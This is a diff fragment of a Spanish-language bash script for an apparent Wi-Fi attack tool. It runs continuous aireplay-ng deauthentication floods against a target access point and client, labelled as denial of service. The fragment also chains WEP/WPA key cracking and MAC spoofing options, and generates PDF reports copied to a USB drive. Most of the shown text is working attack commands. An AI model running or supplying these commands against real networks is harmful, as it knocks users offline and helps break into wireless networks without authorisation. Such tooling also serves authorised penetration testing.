+	INTERFAZ=`cat $ARCHIVO_TARJETA_SELECCIONADA`
+
+	sudo airmon-ng start $INTERFAZ $CANAL
+	X1="airmon-ng start $INTERFAZ $CANAL"
+	sleep 10s
+
+	echo "REALIZANDO DENEGACION DE SERVICIO........" > $ARCHIVO_STATUSBAR
+
+	#sudo xterm -hold -e "aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR" &
+	(aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR &>/dev/null &)
+	X2="aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR"
+
+	BuscarClienteConectado $CAPTURA_AIRCRACK $BSSID
+
+	#sudo xterm -hold -e "aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" &
+	(aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR &>/dev/null &)
+	X3="aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
+
+	TIEMPO_ESCANEO="10"
+	for A in `seq 1 $TIEMPO_ESCANEO` 
+	do
+		sleep 1s
+		if [ $A -eq $TIEMPO_ESCANEO ]
+		then
+			sudo killall xterm
+		else
+			TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
+		fi
+	done
+	
+	#Comprobar la DOS
+	
+	(sudo python "$RUTA_INFORME/SUBSDOS.py" "$X1" "$X2" "$X3" "$X4")
+
+	sudo airmon-ng stop $TARJETA_MODO_MONITOR
+	sleep 5s
+	sudo airmon-ng start $INTERFAZ
+}
+
+CrearInformeWEP() {
+	cd $RUTA_INFORME
+	echo "GENERANDO INFORME WEP........" > $ARCHIVO_STATUSBAR
+	xterm -hold -e "pdflatex -interaction=nonstopmode informe_WEP.tex" &
+	sleep 30s
+	killall xterm
+	cd $RUTA_BASE
+
+	sudo cp -rf "$RUTA_INFORME/informe_WEP.pdf" "/media/root/1064-1D41/"
+
+	ATAQUE_ACABADO="SI"
+	echo "FIN" > $ARCHIVO_LOG
+}
+
+CrearInformeWPA() {
+	cd $RUTA_INFORME
+	xterm -hold -e "pdflatex -interaction=nonstopmode informe-WPA.tex" &
+	sleep 30s
+	killall xterm
+	cd $RUTA_BASE
+
+	sudo cp -rf "$RUTA_INFORME/informe_WEP.pdf" "/media/root/1064-1D41/"
+
+	ATAQUE_ACABADO="SI"
+	echo "FIN" > $ARCHIVO_LOG
+}
+
+
+case $1 in
+  "1") TARJETA_SELECCIONADA=$2 ; ActivarModoMonitor ;;
+  "2") TIEMPO_SCANEO=$2 ; ValidarTiempos 2; ScanearRedes ;;
+  "3") TIEMPO_ATAQUE=$2; LINEA_ATAQUE=$3; ValidarTiempos 3; ExtraerDatosAp;AircrackWPA;DenegacionServicio;CrearInformeWPA;;
+  "4") TARJETA_SELECCIONADA=$2;LIMPIAR ;;
+  "5") LINEA_PORTAPAPELES=$2; COLUMNA_A_COPIAR=$3;CopiarPortapapeles;;
+  "6") ExportarKeys;;
+  "7") ActualizarScript;;
+  "8") ActualizarDatabase;;
+  "9") CambioMacManual;;
+ "10") CambioMacRandom;;
+ "11") TIEMPO_ATAQUE=$2; LINEA_ATAQUE=$3; ValidarTiempos 3; AircrackWEP;DenegacionServicio; CrearInformeWEP;;
+esac
